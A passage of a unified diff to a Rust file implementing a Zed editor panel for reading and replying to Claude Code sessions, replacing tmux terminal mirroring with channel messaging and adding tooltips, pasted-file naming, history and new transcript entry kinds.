@@ -26,18 +26,19 @@ use editor::{Editor, EditorEvent, actions::Paste};
 use fs::Fs;
 use gpui::{
     AbsoluteLength, Animation, AnimationExt as _, AnyElement, AsyncWindowContext, ClipboardEntry,
-    DragMoveEvent, Entity, EventEmitter, FocusHandle, Focusable, FontWeight, Hsla, Image,
-    ImageFormat, Length, ListAlignment, ListSizingBehavior, ListState, MouseButton, MouseDownEvent,
-    Pixels, Rems, Render, ScrollHandle, Subscription, Task, TextStyleRefinement, WeakEntity, img,
-    list,
+    ClipboardItem, DragMoveEvent, Empty, Entity, EventEmitter, FocusHandle, Focusable, FontWeight,
+    Hsla, Image, ImageFormat, Length, ListAlignment, ListSizingBehavior, ListState, Pixels, Rems,
+    Render, ScrollHandle, Subscription, Task, TextStyleRefinement, WeakEntity, img, list,
     pulsating_between, relative,
 };
 use markdown::{HeadingLevelStyles, Markdown, MarkdownElement, MarkdownFont, MarkdownStyle};
 use serde_json::Value;
 use settings::{DockSide, Settings as _};
+use sha2::{Digest as _, Sha256};
 use task::{RevealStrategy, SpawnInTerminal, TaskId};
-use terminal_view::TerminalView;
+use terminal_view::terminal_panel::TerminalPanel;
 use theme::Appearance;
+use tmux_sessions::tmux_attach_command;
 use ui::{
     Button, ButtonStyle, Checkbox, Disclosure, Divider, ListItem, ListItemSpacing, ScrollAxes,
     Scrollbars, SelectableButton as _, TintColor, ToggleState, Tooltip, WithScrollbar as _,
@@ -52,20 +53,41 @@ use workspace::{
 use zed_actions::editor::{MoveDown, MoveUp};
 
 use crate::{
-    ClaudeSessionStore, ClaudeSessionsSettings, Interrupt, ModelRates, NextMessage, OpenInEditor,
-    PasteIntoMessage, PreviousMessage, RegisteredSession, SendMessage, SubagentSummary,
-    ToggleFocus, TranscriptRecord, TranscriptTarget, Usage, rates_for_model,
-    session_registry::{Digit, PaneKey, Question, SlashCommand, SlashCommandScope},
-    session_registry::{tmux_session_name, workflow_run_id_in_tool_result},
-    session_source::{FileContents, LocalSource, RemoteSource, SessionInput, SessionSource},
-    transcript::Spend,
+    ChannelInboxEvent, ClaudeSessionStore, ClaudeSessionsSettings, DismissMenus, EndedReason,
+    EndedSession, HookInstallOutcome, LiveSession, LiveState, ModelRates, NextMessage,
+    OpenInEditor, PasteIntoMessage, PreviousMessage, RegisteredSession, RunningTool, SendMessage,
+    SessionRow, StatusSnapshot, SubagentSummary, ToggleFocus, TranscriptRecord, TranscriptTarget,
+    Turn, Usage, rates_for_model,
+    session_registry::{
+        CHANNEL_ARGUMENT_SLASH_COMMANDS, CHANNEL_DIALOG_SLASH_COMMANDS, SlashCommand,
+        SlashCommandScope, channel_setup_commands,
+    },
+    session_registry::{attachment_is_readable, tmux_session_name, workflow_run_id_in_tool_result},
+    session_source::{FileContents, LocalSource, RemoteSource, SessionSource},
+    transcript::{AutoModeFlags, Spend},
 };
 
 const CLAUDE_SESSIONS_PANEL_KEY: &str = "ClaudeSessionsPanel";
+const NOW_ROW_ENTRY_KEY: &str = "now-row";
+
+/// Drag payload for the live-message box's top-edge resize handle.
+struct DraggedLiveMessageDivider;
 
 /// How tall, in rems, the box holding what the session is saying right now may grow
 /// before what does not fit is scrolled to instead.
 const LIVE_MESSAGE_MAX_HEIGHT_REMS: f32 = 10.;
+const LIVE_MESSAGE_MIN_HEIGHT_REMS: f32 = 3.;
+const LIVE_MESSAGE_HEIGHT_PANEL_FRACTION: f32 = 0.6;
+const LIVE_MESSAGE_STALE_MS: i64 = 30_000;
+const INTERRUPT_SENT_MS: i64 = 5_000;
+/// mm:ss has no hour field. Remote events carry the host clock; without a cap a
+/// skewed host would render millions of minutes next to the now row.
+const ELAPSED_DISPLAY_CAP_SECONDS: i64 = 99 * 60 + 59;
+const CONTEXT_METER_WIDTH_PIXELS: f32 = 120.;
+const NARROW_PANEL_WIDTH_PIXELS: f32 = 420.;
+const CONVERSATION_MIN_HEIGHT_REMS: f32 = 6.;
+const MAX_REPORT_UNCLAMPED_LINES: usize = 40;
+const NOTEBOOK_EDIT_TOOL_NAME: &str = "NotebookEdit";
 
 /// How far, in pixels, from the end of that box still counts as being at its end, so that
 /// a reader who has not scrolled it is followed to the newest words. A line is taller
@@ -80,13 +102,22 @@ const TIMESTAMP_FIELD: &str = "timestamp";
 /// Hours and minutes on a 24-hour clock, which is what an answer's line has room for.
 const CLOCK_FORMAT: &str = "%H:%M";
 const LOCAL_COMMAND_SUBTYPE: &str = "local_command";
+const SYSTEM_RECORD_TYPE: &str = "system";
+const AWAY_SUMMARY_SUBTYPE: &str = "away_summary";
+const BRIDGE_STATUS_SUBTYPE: &str = "bridge_status";
+/// What a `bridge_status` URL has to be before the panel offers to open it. The record is
+/// untrusted JSON and the button hands the string to the machine's URL opener, so
+/// anything that is not the bridge's own page is drawn as text and nothing else.
+const BRIDGE_URL_PREFIX: &str = "https://claude.ai/";
 
-/// Timing the CLI writes for its own use: how long a turn took and how many messages
-/// were in it, and nothing a reader of the conversation is looking for. It is the one
-/// record on the conversation's chain with no content at all, so it is left out rather
-/// than drawn as a block of unrecognized JSON.
+/// Timing the CLI writes when a turn closes: how long it took, how many messages were
+/// in it, and how many background agents are still running.
 const TURN_DURATION_SUBTYPE: &str = "turn_duration";
+/// Bookkeeping that the stop hook ran. It carries no text for the reader.
+const STOP_HOOK_SUMMARY_SUBTYPE: &str = "stop_hook_summary";
 const ATTACHMENT_RECORD_TYPE: &str = "attachment";
+const TOTAL_TOKENS_REMINDER_ATTACHMENT: &str = "total_tokens_reminder";
+const AUTO_MODE_ATTACHMENT: &str = "auto_mode";
 
 /// The attachment Claude Code writes for a message typed while it was answering.
 const QUEUED_COMMAND_ATTACHMENT: &str = "queued_command";
@@ -120,13 +151,33 @@ const PERSISTED_OUTPUT_PREVIEW_PREFIX: &str = "Preview (";
 /// holding an unbounded amount of text in one list item would stall the whole panel.
 const MAX_PERSISTED_OUTPUT_BYTES: u64 = 4 * 1024 * 1024;
 
+/// The ceiling the far end puts on one read; asking for more of an image than this would
+/// be answered with a prefix of it, which decodes into nothing. A larger image is offered
+/// behind a button rather than fetched on draw; see [`MAX_SENT_IMAGE_BYTES_ABSOLUTE`].
+const MAX_SENT_IMAGE_BYTES: u64 = 4 * 1024 * 1024;
+
+/// Hard ceiling for a sent image the reader has asked to load anyway. A larger file is
+/// named rather than fetched: a 64 MiB decode would stall the panel.
+const MAX_SENT_IMAGE_BYTES_ABSOLUTE: u64 = 64 * 1024 * 1024;
+
+/// How much of a CLI dispatch's prompt file is read to take its first non-empty line.
+const MAX_DISPATCH_PROMPT_BYTES: u64 = 4 * 1024;
+
 const NO_SESSIONS: &str = "No Claude Code sessions are running on this project's host.";
 const SELECT_A_SESSION: &str = "Select a session to read its conversation.";
 const WAITING_FOR_TRANSCRIPT: &str =
     "This session has not written a transcript file yet. It will appear as soon as it does.";
 const EMPTY_TRANSCRIPT: &str = "This conversation has no messages yet.";
-const READ_ONLY_NOTE: &str = "This session is not running inside tmux, so it can only be read.";
+const READ_ONLY_NOTE: &str = "Zed channel not loaded — click Setup";
 const SELECT_A_SESSION_TO_REPLY: &str = "Select a session to reply to it.";
+const OPEN_IN_TERMINAL_NOTE: &str = "open in terminal / claude.ai";
+const CHANNEL_DELIVERED_NOTE: &str = "delivered to Claude";
+const CHANNEL_WAITING_NOTE: &str = "sent, waiting for the session to pick it up";
+const CHANNEL_PERMISSION_WAITING: &str = "answered — waiting for the session";
+const CHANNEL_PERMISSION_UNAVAILABLE: &str =
+    "Approve in the terminal or on claude.ai (channel not loaded)";
+const QUESTION_CHANNEL_NOTE: &str = "The answer is delivered as a message because Claude Code does not relay questions to channels.";
+const CHANNEL_WAIT_FOR_TRANSCRIPT_MS: i64 = 60_000;
 const MESSAGE_PLACEHOLDER: &str = "Message this session…";
 const SENDING_NOTE: &str = "Sending…";
 const THINKING_NOTE: &str = "Thinking…";
@@ -149,10 +200,24 @@ const COMMAND_ARGS_WRAPPER: &str = "command-args";
 /// call is running.
 const TOOL_TARGET_CHARACTERS: usize = 40;
 
+/// First line of a `prompt` argument when that is the tool's target.
+const TOOL_TARGET_PROMPT_CHARACTERS: usize = 80;
+
+/// How much text an `Edit` may carry before its card stops diffing it line by line. The
+/// diff is derived once per record, but a pair of megabyte strings is still work nothing
+/// on screen can use.
+const MAX_EDIT_DIFF_BYTES: usize = 128 * 1024;
+
 /// One cycle of the pulse that marks something as still in progress — a message that has
 /// not arrived, a session that is answering. Matches the period the agent panel pulses
 /// its own icons at.
 const PULSE_PERIOD: Duration = Duration::from_secs(1);
+const FILE_LIST_DEBOUNCE: Duration = Duration::from_millis(150);
+const SLASH_COMMAND_CACHE_DURATION: Duration = Duration::from_secs(30);
+const MESSAGE_HISTORY_LIMIT: usize = 200;
+
+/// How long a second click on Stop is accepted before the control disarms itself.
+const STOP_ARM_MS: i64 = 5_000;
 
 /// How many lines of a tool's output are drawn before the rest is put behind a
 /// disclosure. A build log or a test run is thousands of lines, and one of them drawn
@@ -162,6 +227,10 @@ const MAX_UNCLAMPED_OUTPUT_LINES: usize = 12;
 /// The one tool whose input is a command rather than a description of one, so the
 /// command itself is what is drawn, in the shell's own syntax.
 const BASH_TOOL_NAME: &str = "Bash";
+const TODO_WRITE_TOOL_NAME: &str = "TodoWrite";
+const ASK_USER_QUESTION_TOOL_NAME: &str = "AskUserQuestion";
+const EDIT_TOOL_NAME: &str = "Edit";
+const WRITE_TOOL_NAME: &str = "Write";
 
 /// The tools that carry the text of the file they are about, and the field of their
 /// input it sits in. That text is what the call is, so it is what is drawn, in the
@@ -206,6 +275,15 @@ const TASK_NOTIFICATION_CLOSE: &str = "</task-notification>";
 const TASK_NOTIFICATION_ID_OPEN: &str = "<task-id>";
 const TASK_NOTIFICATION_ID_CLOSE: &str = "</task-id>";
 
+const PEER_MESSAGE_LEAD: &str = "Another Claude session sent a message:";
+const AGENT_MESSAGE_WRAPPER: &str = "agent-message";
+const CHANNEL_WRAPPER: &str = "channel";
+const HUMAN_ORIGIN: &str = "human";
+const CHANNEL_ORIGIN: &str = "channel";
+const PEER_ORIGIN: &str = "peer";
+const TASK_NOTIFICATION_ORIGIN: &str = "task-notification";
+const SYSTEM_PROMPT_SOURCE: &str = "system";
+
 /// The sentence Claude Code writes immediately after the output path. The path is cut
 /// here rather than at the first `. `, because a `. ` can be part of the path itself.
 const BACKGROUND_OUTPUT_FOLLOWING_SENTENCE: &str = ". You will be notified";
@@ -233,55 +311,8 @@ const NO_OUTPUT_NOTE: &str = "(no output)";
 /// beside every message competes with the text for attention.
 const ROLE_RAIL_OPACITY: f32 = 0.5;
 
-/// How much of the session's terminal is mirrored. Enough for a prompt and its options,
-/// the queued messages behind a running turn, and the status line under them — the parts
-/// of the screen that are not in the transcript.
-const PANE_MIRROR_LINES: usize = 14;
-
 /// Multiples of the text's own size, for the lines within a paragraph.
 const CONVERSATION_LINE_HEIGHT: f32 = 1.5;
-
-/// What Claude Code writes beside the permission mode it is in, at the foot of its
-/// screen: `⏵⏵ auto mode on (shift+tab to cycle) · ← for agents`.
-const PERMISSION_MODE_HINT: &str = "(shift+tab to cycle)";
-
-/// Said in place of the mode's name when the screen does not carry one. The CLI writes
-/// the line above only for the modes it considers worth announcing, so its absence is
-/// the ordinary mode rather than a session whose mode is unknowable.
-const UNNAMED_PERMISSION_MODE: &str = "Permission mode";
-
-/// Longer than any mode Claude Code has named, and short enough that a line of the
-/// conversation quoting the hint is not mistaken for the footer.
-const MAX_PERMISSION_MODE_CHARACTERS: usize = 40;
-
-/// The mode that turns the permission prompts off altogether. Named here only to draw
-/// its button as the warning it is.
-const BYPASSING_PERMISSIONS: &str = "bypass";
-
-/// The permission mode the session is in, read off the foot of its own screen.
-///
-/// The name is taken out of the line rather than matched against a list of the modes,
-/// because Claude Code renames them — what was `accept edits` is `auto mode` now — and a
-/// list would quietly show nothing the first time one changed.
-fn permission_mode(pane_contents: &str) -> Option<SharedString> {
-    // Searched from the bottom: the hint sits in the CLI's footer, and anything above
-    // that which happens to quote it is conversation.
-    pane_contents.lines().rev().find_map(|line| {
-        let before_hint = line.split(PERMISSION_MODE_HINT).next()?;
-        if before_hint.len() == line.len() {
-            return None;
-        }
-        let named = before_hint.trim();
-        // `on` is the line's own grammar rather than part of the mode's name.
-        let named = named.strip_suffix(" on").unwrap_or(named).trim_end();
-        // The glyphs the CLI marks the mode with are decoration, and differ per mode.
-        let mode = named
-            .trim_start_matches(|character: char| !character.is_alphanumeric())
-            .trim_end();
-        (!mode.is_empty() && mode.chars().count() <= MAX_PERMISSION_MODE_CHARACTERS)
-            .then(|| SharedString::from(mode.to_string()))
-    })
-}
 
 /// What the toolbar says about the session, left to right: the model answering it, the
 /// effort it is answering at, how much context its newest answer was given, and what it
@@ -289,6 +320,7 @@ fn permission_mode(pane_contents: &str) -> Option<SharedString> {
 ///
 /// Each is left out when the transcript does not say it, rather than shown as a blank or
 /// a zero — a session that has not answered yet knows none of them.
+#[cfg(test)]
 fn session_facts(spend: &Spend) -> Vec<SharedString> {
     let mut facts = Vec::new();
     if let Some(model) = spend.model.clone() {
@@ -296,18 +328,6 @@ fn session_facts(spend: &Spend) -> Vec<SharedString> {
     }
     if let Some(effort) = spend.effort.clone() {
         facts.push(effort);
-    }
-    if spend.context_tokens > 0 {
-        let context = compact_token_count(spend.context_tokens);
-        // Marked when it came from a compaction rather than an answer: that figure counts
-        // the kept conversation alone, so the next answer measures a larger context once
-        // the system prompt, the tools and the skills are re-sent. Without the word, that
-        // jump reads as the panel having been wrong.
-        facts.push(SharedString::from(if spend.context_is_post_compaction {
-            format!("{context} ctx (compacted)")
-        } else {
-            format!("{context} ctx")
-        }));
     }
     // What the session has spent, as against what it is carrying: the context figure
     // above is the size of one request, and says nothing about how much work has gone
@@ -328,7 +348,70 @@ fn session_facts(spend: &Spend) -> Vec<SharedString> {
     if let Some(cost) = session_cost(spend) {
         facts.push(cost);
     }
+    if let Some(reported) = spend.reported.as_ref()
+        && let Some(lines) = line_change_fact(reported.lines_added, reported.lines_removed)
+    {
+        facts.push(lines);
+    }
     facts
+}
+
+fn line_change_fact(added: u64, removed: u64) -> Option<SharedString> {
+    if added == 0 && removed == 0 {
+        return None;
+    }
+    Some(SharedString::from(format!("+{added} −{removed} lines")))
+}
+
+/// The whole tooltip the permission chip carries: the mode, the auto-mode flags, and the
+/// bash-first steer the flags have no room for.
+fn permission_tooltip(
+    permission_mode: Option<&str>,
+    auto_mode: Option<AutoModeFlags>,
+    bash_first_steer: Option<&str>,
+) -> String {
+    let mut tooltip = auto_mode_tooltip(permission_mode, auto_mode);
+    if let Some(steer) = bash_first_steer
+        .map(str::trim)
+        .filter(|steer| !steer.is_empty())
+    {
+        tooltip.push_str(&format!(
+            "\nBash-first steer: {}",
+            truncate_and_trailoff(steer, AUTO_MODE_STEER_CHARACTERS)
+        ));
+    }
+    tooltip
+}
+
+/// How much of the `bashFirstSteer` string a tooltip shows. It is free text from the
+/// transcript, and a tooltip is not where a paragraph of it belongs.
+const AUTO_MODE_STEER_CHARACTERS: usize = 80;
+
+fn auto_mode_tooltip(permission_mode: Option<&str>, auto_mode: Option<AutoModeFlags>) -> String {
+    let mut lines = vec![format!(
+        "Permission mode: {}",
+        permission_mode
+            .filter(|mode| !mode.is_empty())
+            .unwrap_or("unknown")
+    )];
+    if let Some(flags) = auto_mode {
+        let mut parts = Vec::new();
+        if flags.bash_first {
+            parts.push("bash-first");
+        }
+        if flags.steer_only {
+            parts.push("steer-only");
+        }
+        if flags.bypass {
+            parts.push("bypass");
+        }
+        if parts.is_empty() {
+            lines.push("Auto mode: on".to_string());
+        } else {
+            lines.push(format!("Auto mode: {}", parts.join(", ")));
+        }
+    }
+    lines.join("\n")
 }
 
 /// What one answer cost, and the tokens behind the figure.
@@ -344,7 +427,11 @@ fn answer_cost(
 ) -> Option<SharedString> {
     let spend = store.transcript().spend();
     let rates = rates_for_model(spend.model.as_deref()?)?;
-    Some(SharedString::from(answer_summary(usage, rates, answered_at)))
+    Some(SharedString::from(answer_summary(
+        usage,
+        rates,
+        answered_at,
+    )))
 }
 
 /// The line drawn under an answer when the reader has asked what it cost.
@@ -354,11 +441,7 @@ fn answer_cost(
 /// cache read at a tenth of it — so one combined "in" figure says nothing about where an
 /// answer's money went. Each is left out when it is zero, which keeps the line short on
 /// the answers that only read from the cache.
-fn answer_summary(
-    usage: Usage,
-    rates: ModelRates,
-    answered_at: Option<&SharedString>,
-) -> String {
+fn answer_summary(usage: Usage, rates: ModelRates, answered_at: Option<&SharedString>) -> String {
     // First, because it is what the rest of the line is dated by: the cache write below
     // says how long what this answer wrote lives, and that is only an expiry once there
     // is a time to count it from.
@@ -487,6 +570,52 @@ fn message_with_mention(text: &str, path: &str) -> Option<String> {
     Some(format!("{before}@{path} "))
 }
 
+fn pasted_file_name(now_ms: i64, extension: &str, contents: &[u8]) -> String {
+    let digest = Sha256::digest(contents);
+    let short_hash: String = format!("{digest:x}").chars().take(6).collect();
+    format!("pasted-{}-{short_hash}.{extension}", now_ms.max(0),)
+}
+
+fn pasted_path_for_message(path: &Path, session_directory: Option<&Path>) -> String {
+    if let Some(relative) = session_directory
+        .and_then(|directory| path.strip_prefix(directory).ok())
+        .filter(|relative| !relative.as_os_str().is_empty())
+    {
+        format!("@{}", relative.to_string_lossy())
+    } else {
+        path.to_string_lossy().into_owned()
+    }
+}
+
+fn uninstall_hooks_note(result: anyhow::Result<()>) -> SharedString {
+    match result {
+        Ok(()) => SharedString::from(
+            "Hooks uninstalled. Run `claude mcp remove zed-claude` to remove the MCP server.",
+        ),
+        Err(error) => SharedString::from(format!("Could not uninstall: {error:#}")),
+    }
+}
+
+fn matching_files(files: &[SharedString], query: &str) -> Vec<SharedString> {
+    if query.is_empty() {
+        return Vec::new();
+    }
+    let query = query.to_lowercase();
+    let mut starting = Vec::new();
+    let mut containing = Vec::new();
+    for path in files {
+        let relative_path = path.to_lowercase();
+        if relative_path.starts_with(&query) {
+            starting.push(path.clone());
+        } else if relative_path.contains(&query) {
+            containing.push(path.clone());
+        }
+    }
+    starting.extend(containing);
+    starting.truncate(FILE_MENU_ROWS);
+    starting
+}
+
 /// A step through the commands menu, or none at all when the highlight is only being
 /// read back.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -566,27 +695,60 @@ enum HistoryStep {
 /// Read back out of the conversation rather than remembered as they are sent: this panel
 /// is opened on sessions it has sent nothing to, and the terminal's Up walks the whole
 /// session either way.
-fn message_history(entries: &[Entry]) -> Vec<SharedString> {
-    let mut history: Vec<SharedString> = Vec::new();
-    for entry in entries.iter().rev() {
-        let EntryKind::Message {
-            role: MessageRole::User,
-            source,
-            ..
-        } = &entry.kind
-        else {
-            continue;
-        };
-        let text = source.trim();
-        if text.is_empty() {
+#[cfg(test)]
+fn message_history(
+    pending_sends: &PendingSends,
+    transcript: &crate::Transcript,
+) -> Vec<SharedString> {
+    message_history_matching(pending_sends, transcript, |_| true)
+}
+
+/// The same, for the conversation `selected` is being read in. A message still waiting in
+/// another session is not this conversation's history: switching session now hides those
+/// rows rather than dropping them, and Up must still walk what was typed here.
+fn message_history_for(
+    pending_sends: &PendingSends,
+    transcript: &crate::Transcript,
+    selected: Option<&str>,
+) -> Vec<SharedString> {
+    message_history_matching(pending_sends, transcript, |send| {
+        Some(send.session_id.as_str()) == selected
+    })
+}
+
+fn message_history_matching(
+    pending_sends: &PendingSends,
+    transcript: &crate::Transcript,
+    belongs: impl Fn(&PendingSend) -> bool,
+) -> Vec<SharedString> {
+    let transcript_entries = user_message_entries(&transcript.full_path());
+    let transcript_messages = user_messages(&transcript_entries);
+    let mut history = Vec::new();
+    let messages = pending_sends
+        .sends
+        .iter()
+        .rev()
+        .filter(|send| belongs(send))
+        .map(|send| send.text.as_ref())
+        .chain(
+            transcript_messages
+                .iter()
+                .rev()
+                .map(|(_, text)| text.as_ref()),
+        );
+    for message in messages {
+        let message = message.trim();
+        if message.is_empty()
+            || history
+                .last()
+                .is_some_and(|last: &SharedString| last.as_ref() == message)
+        {
             continue;
         }
-        // Consecutive repeats are one entry, as a shell's history has them: a message
-        // sent twice is not two things to walk past.
-        if history.last().is_some_and(|last| last.as_ref() == text) {
-            continue;
+        history.push(SharedString::from(message.to_string()));
+        if history.len() == MESSAGE_HISTORY_LIMIT {
+            break;
         }
-        history.push(SharedString::from(text.to_string()));
     }
     history
 }
@@ -703,28 +865,6 @@ const CONVERSATION_SCROLLBAR_COLOR: Hsla = Hsla {
     a: 1.,
 };
 
-/// Tall enough for a prompt and its options without taking the conversation's room. The
-/// reader drags it from here.
-const DEFAULT_TERMINAL_HEIGHT: Pixels = px(260.);
-
-/// The grab area on the terminal's top edge.
-const TERMINAL_RESIZE_HANDLE_HEIGHT: Pixels = px(4.);
-
-const MIN_TERMINAL_HEIGHT: Pixels = px(80.);
-
-const MAX_TERMINAL_HEIGHT: Pixels = px(1200.);
-
-/// Dragged when the terminal's top edge is pulled. Nothing is carried across the screen:
-/// the edge itself is what moves, so the preview draws nothing.
-#[derive(Clone)]
-struct DraggedTerminalDivider;
-
-impl Render for DraggedTerminalDivider {
-    fn render(&mut self, _window: &mut Window, _cx: &mut Context<Self>) -> impl IntoElement {
-        gpui::Empty
-    }
-}
-
 pub struct ClaudeSessionsPanel {
     workspace: WeakEntity<Workspace>,
     focus_handle: FocusHandle,
@@ -760,45 +900,33 @@ pub struct ClaudeSessionsPanel {
     /// Whether the list of sessions is showing its rows. Collapsing it gives the whole
     /// panel to the conversation, which is what the user is here to read.
     session_list_expanded: bool,
-    /// The sessions whose agent rows are folded away, by process id. Held as what is
+    /// The sessions whose agent rows are folded away, by session id. Held as what is
     /// closed rather than as what is open, so that a session listed for the first time
     /// arrives showing what it is running rather than hiding it.
-    collapsed_session_agents: HashSet<u32>,
+    collapsed_session_agents: HashSet<String>,
     /// True for the copy opened as an editor tab, which is already where opening one
     /// would take the reader.
     in_pane: bool,
-    /// Whether the session's terminal is showing. Closed by default: what it carried
-    /// that the conversation did not — a question waiting to be answered, the words of a
-    /// turn still running — is drawn as this panel's own now, so the terminal is the way
-    /// back to the raw screen rather than the way to read the session.
-    pane_expanded: bool,
-    /// The terminal attached to the selected session's tmux pane, and the session it
-    /// belongs to. Attaching is asynchronous and the reader can select another session
-    /// while it runs, so what it was attached for is kept beside it rather than assumed.
-    terminal: Option<Entity<TerminalView>>,
-    terminal_process_id: Option<u32>,
-    /// How tall the terminal section is. Dragged by its top edge, and kept here rather
-    /// than measured, because the reader's choice has to survive every redraw.
-    terminal_height: Pixels,
-    /// Whether the message input is showing. Open by default: with the terminal closed
-    /// this is where the session is answered, and a question that arrives has nowhere to
-    /// draw itself if this is shut.
+    /// Whether the message input is showing. Open by default: a question that arrives has
+    /// nowhere to draw itself if this is shut.
     input_expanded: bool,
     /// How far up the messages already sent the reader has walked with the Up key, as
     /// the terminal's own history walks. `None` while the box holds their own draft.
     history_index: Option<usize>,
-    /// Whether the Quit button has been pressed once already. Quitting ends the session
-    /// and nothing gives it back, so the first press arms the button rather than
-    /// sending anything.
-    quit_armed: bool,
-    /// The answer being filled in for the question on screen, for a question that takes
-    /// several. Kept here rather than read back from the terminal because nothing is sent
-    /// until the whole answer is submitted: until then the terminal knows nothing about
-    /// what has been ticked.
-    ticked: Option<TickedAnswer>,
-    /// The call the reader chose to answer in their own words rather than by picking, so
-    /// that choosing it for one question does not leave the next one waiting for typing.
-    typing_answer_for: Option<SharedString>,
+    /// Options ticked on a multi-select question, as `(question_index, option_index)`.
+    question_ticks: HashSet<(usize, usize)>,
+    /// The call whose question those ticks were made on. A tick is a position, so ticks
+    /// left over from the question before would come up ticked on the next one.
+    ticked_question: Option<SharedString>,
+    /// Set after Allow/Deny until the hook's pending permission clears.
+    permission_answered: bool,
+    /// The call whose permission that answer was for. Two prompts of one turn can land in
+    /// a single poll — the tool that was allowed finishes and the next permission is asked
+    /// for — and the second one has been answered by nobody.
+    permission_answered_for: Option<SharedString>,
+    /// Why the last Enter did not send, when a slash command needs the terminal or an
+    /// argument.
+    slash_send_note: Option<SharedString>,
     /// The call whose question the input was last opened for, so that it is opened once
     /// per question rather than held open for as long as one is on screen; see
     /// [`ClaudeSessionsPanel::open_the_input_for_a_new_question`].
@@ -808,11 +936,21 @@ pub struct ClaudeSessionsPanel {
     /// [`ClaudeSessionsPanel::follow_the_live_message`].
     live_message_scroll: ScrollHandle,
     live_message_length: usize,
+    live_message_markdown_key: Option<SharedString>,
+    live_message_identity: Option<(Option<String>, usize)>,
+    live_message_height: Pixels,
+    live_message_drag: Option<(Pixels, Pixels)>,
+    now_row_expanded: bool,
+    interrupt_sent_at_ms: Option<i64>,
+    stop_armed_until_ms: Option<(String, i64)>,
+    lifecycle_note: Option<SharedString>,
+    _lifecycle_command: Task<()>,
     /// The paths the `@` menu is offering, and the query they were listed for. Listed
     /// on the machine the session runs on, so the answer arrives after the keystroke
     /// that asked for it and has to say what it is an answer to.
     file_matches: Vec<SharedString>,
     file_matches_for: Option<String>,
+    file_query: Option<String>,
     file_highlight: usize,
     dismissed_file_menu_for: Option<String>,
     /// Held so that dropping it cancels a listing that is still running, and so that a
@@ -820,6 +958,7 @@ pub struct ClaudeSessionsPanel {
     _listing_files: Task<()>,
     /// Held so that dropping it cancels a paste that is still being written.
     _pasting: Task<()>,
+    paste_error: Option<SharedString>,
     /// Which row of the commands menu the arrow keys are on. Kept as an index rather
     /// than as the command it names, because the menu is rebuilt from what is typed on
     /// every keystroke; see [`step_through_menu`].
@@ -831,19 +970,16 @@ pub struct ClaudeSessionsPanel {
     /// listed them. Read once per session rather than per keystroke: the files behind
     /// them change far less often than the reader types.
     slash_commands: Vec<SlashCommand>,
+    slash_commands_for: Option<String>,
+    slash_commands_fresh: bool,
     /// Held so that dropping it cancels a listing that is still running.
     _listing_slash_commands: Task<()>,
-    /// Held so that dropping it cancels an answer that is still being keyed into the
-    /// pane, and so that a second press cannot interleave with the first.
-    _answering: Task<()>,
     /// What installing the hook did, kept on screen afterwards because it says where the
     /// settings it changed were copied to. Cleared when a question can be read, which is
     /// the install having taken effect.
     hook_install_note: Option<SharedString>,
     /// Held so that dropping it cancels an install that is still running.
     _installing_hook: Task<()>,
-    /// Held so that dropping it cancels an attach that is still running.
-    _terminal_attach: Task<()>,
     /// See [`UnreadBelow`].
     unread_below: UnreadBelow,
     /// Whether the reader was at the tail of the conversation the last time the list
@@ -880,6 +1016,15 @@ pub struct ClaudeSessionsPanel {
     overwrites_dropped: usize,
     loaded_outputs: HashMap<SharedString, OutputLoad>,
     output_loads: HashMap<SharedString, Task<()>>,
+    loaded_attachments: HashMap<SharedString, AttachmentLoad>,
+    /// Sent images the reader asked to fetch past [`MAX_SENT_IMAGE_BYTES`].
+    forced_attachment_loads: HashSet<SharedString>,
+    /// The prompt files CLI-dispatch cards were given, keyed by [`dispatch_prompt_key`].
+    dispatch_prompts: HashMap<SharedString, OutputLoad>,
+    /// The calls whose results carry the patch that was applied, so that their cards do
+    /// not draw a second diff of their own; see [`edit_card_diff`].
+    patched_calls: HashSet<SharedString>,
+    attachment_loads: HashMap<SharedString, Task<()>>,
     _store_subscription: Subscription,
     /// Held so that the `@` menu is asked for files as the box changes.
     _editor_subscription: Subscription,
@@ -912,6 +1057,12 @@ enum EntryKind {
     ToolUse {
         name: SharedString,
         input: SharedString,
+        /// The `tool_use` block's own id, which is what a result names its call by.
+        id: Option<SharedString>,
+        /// An `Edit`'s diff of what it was asked to change. Derived here rather than
+        /// while drawing, so that a card that is on screen is not diffed again on every
+        /// frame; see [`edit_input_diff`].
+        diff: Option<SharedString>,
     },
     ToolResult {
         label: SharedString,
@@ -921,6 +1072,14 @@ enum EntryKind {
     Image {
         image: Arc<Image>,
         media_type: SharedString,
+    },
+    /// The files a session handed to its reader with `SendUserFile`.
+    SentFiles {
+        caption: Option<SharedString>,
+        files: Vec<SentFile>,
+        is_error: bool,
+        /// The tool result's own text, shown when the delivery failed.
+        result_text: Option<SharedString>,
     },
     LocalCommand {
         text: SharedString,
@@ -941,6 +1100,8 @@ enum EntryKind {
     Pending {
         id: u64,
         text: SharedString,
+        note: SharedString,
+        failed: bool,
     },
     CompactBoundary {
         trigger: SharedString,
@@ -950,12 +1111,62 @@ enum EntryKind {
     Attachments {
         items: Vec<AttachmentItem>,
     },
+    /// A `system` record with a string `content`: away summaries, bridge status, hook
+    /// notes, and other one-line facts that are not the conversation itself.
+    SystemNote {
+        subtype: SharedString,
+        text: SharedString,
+        url: Option<SharedString>,
+    },
+    /// Written when a turn closes. Placed after the turn it closes, in path order.
+    TurnFooter {
+        duration_ms: u64,
+        message_count: u64,
+        pending_background_agents: u64,
+    },
+    /// One line standing in for a finished turn's tool calls, thinking, and footer.
+    /// The `expanded` set is keyed by the turn's user-record uuid; this entry's own key
+    /// is `{uuid}#summary` so it does not collide with that message.
+    TurnSummary {
+        turn_id: SharedString,
+        calls: usize,
+        files_edited: Vec<SharedString>,
+        agents: usize,
+        thinking_blocks: usize,
+        duration_ms: Option<u64>,
+        pending_background_agents: u64,
+        is_expanded: bool,
+    },
     /// A record or block this panel has no display rule for. Shown as raw JSON rather
     /// than dropped, so that a transcript format that has moved on is still readable.
     Unknown {
         label: SharedString,
         raw: SharedString,
     },
+}
+
+/// One file a session delivered to its reader, as the record of the delivery names it.
+///
+/// The bytes are not in the transcript — only the path on the machine the session runs
+/// on — which is why an image here is fetched rather than decoded out of the record the
+/// way a pasted one is.
+#[derive(Clone, Debug, PartialEq)]
+struct SentFile {
+    path: PathBuf,
+    name: SharedString,
+    /// The size the delivery recorded, which is the file's size when it was sent rather
+    /// than now.
+    size: Option<u64>,
+    media_type: Option<SharedString>,
+    is_image: bool,
+}
+
+impl SentFile {
